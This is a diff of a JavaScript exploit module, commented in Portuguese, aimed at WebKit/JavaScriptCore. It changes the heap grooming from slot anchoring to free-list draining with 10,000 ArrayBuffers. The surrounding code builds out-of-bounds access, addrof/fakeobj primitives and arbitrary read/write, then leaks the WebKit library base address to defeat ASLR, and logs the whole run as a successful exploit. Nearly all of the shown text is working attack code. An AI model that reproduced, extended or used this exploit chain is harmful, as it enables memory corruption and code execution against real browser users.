@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v112 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - ANCORAGEM DE SLOT)
+// js/script3/testArrayBufferVictimCrash.mjs (v113 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - DRENAGEM DE FREE LIST PARA TC ARRAYS)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZA MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
+// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - **RESOLVIDA COLISÃO DE ENDEREÇOS na alocação dos arrays de Type Confusion
-//    através de ANCORAGEM do slot problemático do heap.**
-// - Uso de spray de preenchimento para empurrar a alocação do TC Array.
-// - Removido o par de arrays de type confusion dedicado (simplificação).
+//    através de DRENAGEM EXAUSTIVA da free list para controlar sua alocação.**
+// - Vazamento de ASLR de objeto alocado em slot LIMPO.
+// - Removido o par de arrays de type confusion dedicado.
 // - Priorização do Vazamento de ASLR ANTES de corrupções arbitrárias no heap.
 // - Implementação funcional de vazamento da base da biblioteca WebKit.
 // - Removidas todas as simulações da fase de vazamento.
@@ -28,7 +28,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v112_R60_REAL_ASLR_LEAK_SLOT_ANCHORING";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v113_R60_REAL_ASLR_LEAK_DRAIN_FREE_LIST";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -51,16 +51,16 @@ function doubleToInt64(double) {
 }
 
 let global_spray_objects = [];
-let slot_anchors = []; // Objetos que irão "ancorar" slots problemáticos
+let free_list_drain_spray = []; // Novo spray para drenar free list
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Ancoragem de Slot) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Drenagem de Free List) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
 
-    let addrof_primitive = null; // Usaremos apenas um conjunto de primitivas
+    let addrof_primitive = null;
     let fakeobj_primitive = null;
     let arb_read_primitive = null;
     let arb_write_primitive = null;
@@ -79,8 +79,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logS3("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
 
-        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj (com Ancoragem de Slot) ---
-        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações (com Ancoragem de Slot) ---", "subtest");
+        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj (com Drenagem de Free List) ---
+        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações (com Drenagem de Free List) ---", "subtest");
         const oobSetupStartTime = performance.now();
         logS3("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
         await triggerOOB_primitive({ force_reinit: true });
@@ -92,24 +92,27 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         logS3(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
 
-        // ** ESTRATÉGIA DE ANCORAGEM DO SLOT PROBLEMÁTICO **
-        // O objetivo é preencher o slot 0x402abd70_a3d70a3d com um objeto que não será liberado
-        // para que os arrays de Type Confusion sejam alocados em outro lugar.
-        logS3("Iniciando Ancoragem de Slot para afastar os arrays de Type Confusion do slot problemático...", "info");
-        const ANCHOR_SLOT_COUNT = 500; // Número de objetos âncora a serem criados
-        const ANCHOR_OBJECT_SIZE = 0x20; // Tamanho comum para objetos pequenos (Arrays de 1 double/obj são desse porte)
+        // ** ESTRATÉGIA AGRESSIVA: Drenar a Free List para o tamanho dos Arrays de TC **
+        // O objetivo é forçar confused_array_main/victim_array_main a cair em um slot previsível,
+        // mas primeiro, esvaziar todos os slots pequenos problemáticos.
+        logS3("Iniciando Drenagem da Free List para alocar arrays de Type Confusion em slots controlados...", "info");
+        const DRAIN_OBJECT_COUNT = 10000; // Número de objetos para drenar (ajustar!)
+        const DRAIN_OBJECT_SIZE = 0x20; // Tamanho comum para objetos pequenos como arrays de 1 double/object
         
-        // Criar muitos objetos e manter referências a eles.
-        for (let i = 0; i < ANCHOR_SLOT_COUNT; i++) {
-            slot_anchors.push(new ArrayBuffer(ANCHOR_OBJECT_SIZE));
+        // Crie muitos objetos para "drenar" a free list de slots desse tamanho
+        for (let i = 0; i < DRAIN_OBJECT_COUNT; i++) {
+            free_list_drain_spray.push(new ArrayBuffer(DRAIN_OBJECT_SIZE));
         }
-        logS3(`Criados ${slot_anchors.length} objetos âncora (${toHex(ANCHOR_OBJECT_SIZE)} bytes cada).`, "debug");
-        await PAUSE_S3(50); // Dar um tempo para as alocações se estabilizarem.
+        logS3(`Criados ${free_list_drain_spray.length} objetos de drenagem (${toHex(DRAIN_OBJECT_SIZE)} bytes cada).`, "debug");
 
-        logS3("Tentando alocar o par de arrays de Type Confusion principal APÓS a ancoragem...", "info");
+        await PAUSE_S3(50); // Pausa para o alocador reagir.
+
+        logS3("Tentando alocar o par de arrays de Type Confusion principal APÓS a drenagem...", "info");
 
         // === Par de Arrays de Type Confusion PRINCIPAL ===
-        const confused_array_main = [13.37]; // Espera-se que caia em um slot diferente agora
+        // Agora, eles deveriam cair em slots "novos" ou mais previsíveis,
+        // pois a free list de slots pequenos foi drenada.
+        const confused_array_main = [13.37];
         const victim_array_main = [{ a: 1 }];
 
         logS3(`Array 'confused_array_main' inicializado: [${confused_array_main[0]}]`, "debug");
@@ -144,7 +147,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             return obj;
         };
-        logS3("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas (com Ancoragem de Slot).", "good");
+        logS3("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas (com Drenagem de Free List).", "good");
+
 
         // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
@@ -203,11 +207,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info...", "info");
 
         // 1. Criar um Uint8Array para ter um objeto do tipo ArrayBufferView
-        // Este Uint8Array agora será alocado APÓS os objetos âncora, em um slot mais limpo.
-        const leak_candidate_u8a = new Uint8Array(16); // Tamanho ligeiramente maior para o Uint8Array também
-        logS3(`Objeto Uint8Array (tamanho 16) criado para vazamento de ClassInfo (após ancoragem de slot): ${leak_candidate_u8a}`, "debug");
+        // Agora, o Uint8Array(16) deve ser alocado em um slot diferente,
+        // pois a free list de pequenos objetos deve ter sido "drenada" pelo spray.
+        const leak_candidate_u8a = new Uint8Array(16); 
+        logS3(`Objeto Uint8Array (tamanho 16) criado para vazamento de ClassInfo (após drenagem de free list): ${leak_candidate_u8a}`, "debug");
 
         // 2. Obter o endereço de memória do objeto leak_candidate (Uint8Array)
+        // Usamos addrof_primitive que opera no par de arrays principal, que agora
+        // esperamos que tenha um endereço mais controlado.
         const leak_candidate_addr = addrof_primitive(leak_candidate_u8a);
         logS3(`[REAL LEAK] Endereço do leak_candidate (Uint8Array): ${leak_candidate_addr.toString(true)}`, "leak");
 
@@ -225,7 +232,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         
         if (collision_detected) {
-            throw new Error("[REAL LEAK] Falha de alocação do objeto de vazamento ASLR: Colisão de endereços persistente. Ajustar estratégia de ancoragem de slot.");
+            throw new Error("[REAL LEAK] Falha de alocação do objeto de vazamento ASLR: Colisão de endereços persistente. Ajustar estratégia de drenagem de free list.");
         }
         // *************************************************************
 
@@ -319,7 +326,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
             final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak}/${numResistanceTests})`;
         }
-        logS3(`Verificação funcional de L/E e Teste de Resistência PÓS-Vazamento concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
+        logS3(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
 
         logS3("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
